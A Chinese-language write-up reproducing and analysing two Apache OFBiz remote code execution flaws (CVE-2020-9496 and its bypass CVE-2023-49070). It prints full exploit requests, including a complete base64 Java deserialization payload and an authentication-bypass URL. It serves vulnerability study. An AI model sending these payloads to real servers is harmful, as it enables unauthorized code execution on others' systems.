# CVE-2020-9496

最近披露了Apache OFBiz 未授权远程代码执行漏洞，是对CVE-2020-9496的绕过，所以先来看看这个漏洞

复现环境：17.12.03

影响范围：**Apache Ofbiz：< 17.12.04**

## 环境搭建

- 下载：https://downloads.apache.org/ofbiz/

打开项目，配置如下

![image-20231206194156537](images/1.png)

等这一步加载完成等了好久，接下来就是像maven一样编译

![image-20231206215656479](images/2.png)

得到了一个Jar包，接下来运行它

![image-20231206215947193](images/3.png)

这里我运行报错了，直接去运行org.apache.ofbiz.base.start.Start

![image-20231206222808410](images/4.png)

可以访问https://localhost:8443/accounting

## 漏洞复现

```
POST /webtools/control/xmlrpc HTTP/1.1
Host: 127.0.0.1:8443
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/xml
Content-Length: 181

<?xml version="1.0"?>
<methodCall>
<methodName>ProjectDiscovery</methodName>
<params>
    <param>
    <value>
        <struct>
        <member>
            <name>test</name>
            <value>
            <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">
           base64的payload
            </serializable>
            </value>
        </member>
        </struct>
    </value>
    </param>
</params>
</methodCall>

```

这里直接用yakit发，开始打半天没打通，后面才看到是解码错误，是百分号的问题，平常发base64习惯urlencode发，直接用原始的base64发包即可

![image-20231207102506552](images/5.png)

![image-20231207102422114](images/6.png)

## XML-RPC消息格式

> - 文档：http://xmlrpc.com/spec.md
>
> 每个XML-RPC请求都以`<methodCall></methodCall>`开头，该元素包含单个子元素`<methodName>method</methodName>`，元素`<methodName>`包含子元素`<params>`，`<params>`可以包含一个或多个`<param>`元素。如：
>
> ```
> POST /RPC2 HTTP/1.0
> User-Agent: Frontier/5.1.2 (WinNT)
> Host: betty.userland.com
> Content-Type: text/xml
> Content-length: 181
> 
> <?xml version="1.0" encoding="utf-8"?>
> <methodCall> 
>   <methodName>examples.getStateName</methodName>  
>   <params> 
>     <param> 
>       <value>
>         <i4>41</i4>
>       </value> 
>     </param> 
>   </params> 
> </methodCall>
> ```
>
> 几种常见的数据类型
>
> ```
> <!-- array -->
> <value>
>   <array>
>     <data>
>       <value><int>7</int></value>
>     </data>
>   </array>
> </value>
> 
> 
> <!-- struct -->
> <struct> 
>   <member> 
>     <name>foo</name> 
>     <value>bar</value> 
>   </member> 
> </struct>
> ```

## 漏洞分析

路由在webtools/webapp/webtools/WEB-INF/web.xml下配置了servlet

![image-20231207115523065](images/7.png)

跟进control，后续在doGet方法中经过一些设置后，使用RequestHandler的doRequest来处理请求

![image-20231207115702053](images/8.png)

对于这里的requestHandler是在doGet开头通过this.getRequestHandler()获取到的

![image-20231207121501980](images/9.png)

![image-20231207121617946](images/10.png)

跟进后可以看到，其实这里是取的与web.xml同目录下的controller.xml

![image-20231207121718085](images/11.png)

然后会对EventFactory等实例化

![image-20231207121816627](images/12.png)

其实就是设置对应的handler，回到doRequest方法

![image-20231207120142774](images/13.png)

这里requestMapMap定义了216个requestMap，随后跟进访问的路径xmlrpc从Map取出对应的value的阿斗了requestMap

![image-20231207120352380](images/14.png)

往后继续看

![image-20231207120515471](images/15.png)

走到了runEvent函数来处理请求（这里有好几个runEvent的调用，主要有一些检查登陆的event在前面）

![image-20231207120609522](images/16.png)

runEvent函数中会查找对应event到handler然后进行invoke方法调用，以上就是web方面路由的调用

当处理到xmrpc的时候

![image-20231207121115914](images/17.png)

调用对应的invoke方法

![image-20231207121153227](images/18.png)

没有传入echo参数进入else分支

![image-20231207121226580](images/19.png)

这里的getrequest方法会对POST数据进行解析，然后通过execute执行

![image-20231207121257525](images/20.png)

![image-20231207122546651](images/21.png)

在execute方法中通过methodName的值会获取handler

![image-20231207122701465](images/22.png)

跟进getHandler

![image-20231207122800375](images/23.png)

![image-20231207122812122](images/24.png)

可以看到默认定义了3670种methodname，如果找不到则会返回no such service

接下来回到getRequest解析请求的地方

可以看到会对POST的数据使用XMLReader进行解析，以XmlRpcRequestParser为解析器，setFeature这些是为来防止XXE等外部实体解析的

![image-20231207121937619](images/25.png)

接下来就是xml解析操作，包括`startElement()`、`endElement()`等。我们知道在解析器解析xml数据的过程中，会触发到`scanDocument()`操作对元素进行逐一“扫描”，其中就会进行`startElement()`、`endElement()`的调用，这个过程如果处理不当就会引入问题。

在startElement解析最后，会调用父类的startElement

![image-20231207124041938](images/26.png)

![image-20231207124156339](images/27.png)

最后当标签为serializable的时候，会返回SerializableParser对象给上层

![image-20231207124211694](images/28.png)

这里在返回searializableParser的时候前面会有个if，要求pURI等于`http://ws.apache.org/xmlrpc/namespaces/extensions`，这也就是为什么payload中会有`<serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">`

![image-20231207133251033](images/29.png)

在得到返回的对象后调用SerializableParser的startElement方法

![image-20231207124354020](images/30.png)

这里会创建一个base64解码器，这里应该是调用其父类ByteArrayParser的startElement

![image-20231207124452626](images/31.png)

然后会调用到characters方法对base64进行解码，并且会在解码后写入字节流，这里知道会base64解码即可

接下来就按节点调用endElement了，刚才是递增从外向内，那么end的时候就是递减从内向外开始解析了

![image-20231207134522573](images/32.png)

先设置了result

![image-20231207125824008](images/33.png)

接下来是value节点

![image-20231207131120323](images/34.png)

当调用到MapParser的时候，会调用endValueTag

![image-20231207131204403](images/35.png)

调用对应typeParser的getResult方法

![image-20231207131226716](images/36.png)

取出原先设置的result直接反序列化，而ofbiz本身是有CB链的依赖的

## 为什么要用struct

![image-20231207133631383](images/37.png)

可以看到在XmlRpcRequestParser的节点解析中，前面几个默认是methodCall，methodName，params，param，这个处理过程是随着每次遍历标签进行的，当扫描完4个必须提供的标签后，会调用父类的`startElement()`进行处理，而typeParser就是在父类中完成赋值的，随后便通过不同的解析器进入不同的解析流程，还是会调用对应解析器的`startElement`，这个过程是递归的

也就是前面提到的消息格式

```
<?xml version="1.0" encoding="utf-8"?>
<methodCall> 
  <methodName>examples.getStateName</methodName>  
  <params> 
    <param> 
      <value>
        <i4>41</i4>
      </value> 
    </param> 
  </params> 
</methodCall>
```

后面default开始解析的时候其实是从value节点内的东西开始的，这里应该是`<i4>`

![image-20231207133753799](images/38.png)

![image-20231207135733230](images/39.png)

而前面我们提到的获得searializableParser，虽然直接传入可以得到base64解码器，但是在调用endElement的时候，只能调用到setResult，不能到最后getResult来触发反序列化

![image-20231207134345077](images/40.png)

最后选用了struct标签，它能把数据作为一个结构体传入

```
<?xml version="1.0"?>
<methodCall>
  <methodName>ping</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>foo</name>
            <value>aa</value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>
```

![image-20231207140041234](images/41.png)

最后在MapParser中调用了标签内typeParser的getResult方法触发反序列化

## 漏洞修复

https://github.com/apache/ofbiz-framework/commit/4bdfb54ffb6e05215dd826ca2902c3e31420287a

![image-20231207140336534](images/42.png)

主要就是在controller.xml加上了对于/webtools/control/xmlrpc路由的鉴权

但是在下面这个漏洞中，我看到增加的东西不仅这些，可能后续还进行了增加的，在CacheFilter中还增加了对serializable标签的检查

![image-20231207154607040](images/43.png)

### 具体怎么鉴权的呢

RequestHandler的获取是与Controller.xml相关，涉及到的event调用也有需要授权和不需要授权的

![image-20231207161016093](images/44.png)

首先是一些需要预加载的相关event的循环调用

![image-20231207161128297](images/45.png)

接下来是检测需要相关requestMap是否需要鉴权

![image-20231207161205531](images/46.png)

需要的话就调用LoginWorker的login方法（runEvent中通过反射实现）对其进行鉴权，如果鉴权通过或者不需要坚强就调用runEvent对其进行处理走到后续流程

![image-20231207162155429](images/47.png)

# CVE-2023-49070

这个洞是CVE-2020-9496的绕过

漏洞影响范围：Apache OFBiz before 18.12.10

复现环境：18.12.09

## 漏洞复现

在https://www.oscs1024.com/hd/MPS-ope5-i4zj这个漏洞通告中已经给出了权限绕过的payload，结合上一个洞

```
POST /webtools/control/xmlrpc/;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y HTTP/1.1
Host: 127.0.0.1:8443
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/xml
Content-Length: 181

<?xml version="1.0"?>
<methodCall>
<methodName>ProjectDiscovery</methodName>
<params>
    <param>
    <value>
        <struct>
        <member>
            <name>test</name>
            <value>
            <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">
            rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABqbK/rq+AAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQASb3BlbiAtYSBDYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAdeXNvc2VyaWFsL1B3bmVyNjQzNTgzNjA0MzcyNTABAB9MeXNvc2VyaWFsL1B3bmVyNjQzNTgzNjA0MzcyNTA7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAALwAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAANAAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAOAAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJdXEAfgAQAAAB1Mr+ur4AAAAyABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADRm9vAQAMSW5uZXJDbGFzc2VzAQAlTHlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAGgEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwASAAAAAgATAAAAAgAUABEAAAAKAAEAAgAWABAACXB0AARQd25ycHcBAHhxAH4ADXg=
            </serializable>
            </value>
        </member>
        </struct>
    </value>
    </param>
</params>
</methodCall>

```

![image-20231207160137167](images/48.png)

## 漏洞分析

在修复版本中，看到了对xmlrpc路由增加了权限验证

![image-20231207141958045](images/49.png)

具体是怎么加的呢，就是需要登陆，具体的登陆逻辑在LoginWorker中

![image-20231207154708694](images/50.png)

在最开始处理路由的时候，首先会处理checkLogin这个event

![image-20231207154924568](images/51.png)

最后通过反射调用到LoginWorker到extensionCheckLogin方法

![image-20231207155059644](images/52.png)

具体的检测在checkLogin方法

![image-20231207155315812](images/53.png)

这一个if如果进去了就代表没有登陆，会返回一个error，如果没有进这个if则会在最后返回success代表检测结果是成功登陆

![image-20231207155413335](images/54.png)

```
if (username == null
                    || (password == null && token == null)
                    || "error".equals(login(request, response)))
```

三个条件均不成立的时候就可以不进入if，现在我们主要就是要login这个函数返回的值不为error

一直往下看，首先username为空的话会向unpwErrMsgList里面add一个值，然后当requirePasswordChange参数为Y的时候，因为unpwErrMsgList不为空，进入第二个框里面的if，最后三目运算符返回requirePasswordChange

![image-20231207155721727](images/55.png)

这样就自然而然绕过了登陆检测

但是不知道什么时候，ofbiz在CacheFilter中添加了一个doFilter

![image-20231207155956635](images/56.png)

当访问/control/xmlrpc路由的时候会检测body里面是否有`</serializable`，不过这个检测方式就和正常的路由一样，直接添加`/;/`这样就直接绕过了，所以最后权限绕过的payload

```
/webtools/control/xmlrpc/;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y
```





参考链接：

https://mp.weixin.qq.com/s/vGgZxoKSMoiw98z63UuOpw

https://xz.aliyun.com/t/8184/#toc-2

https://xz.aliyun.com/t/8324#toc-5

https://www.oscs1024.com/hd/MPS-ope5-i4zj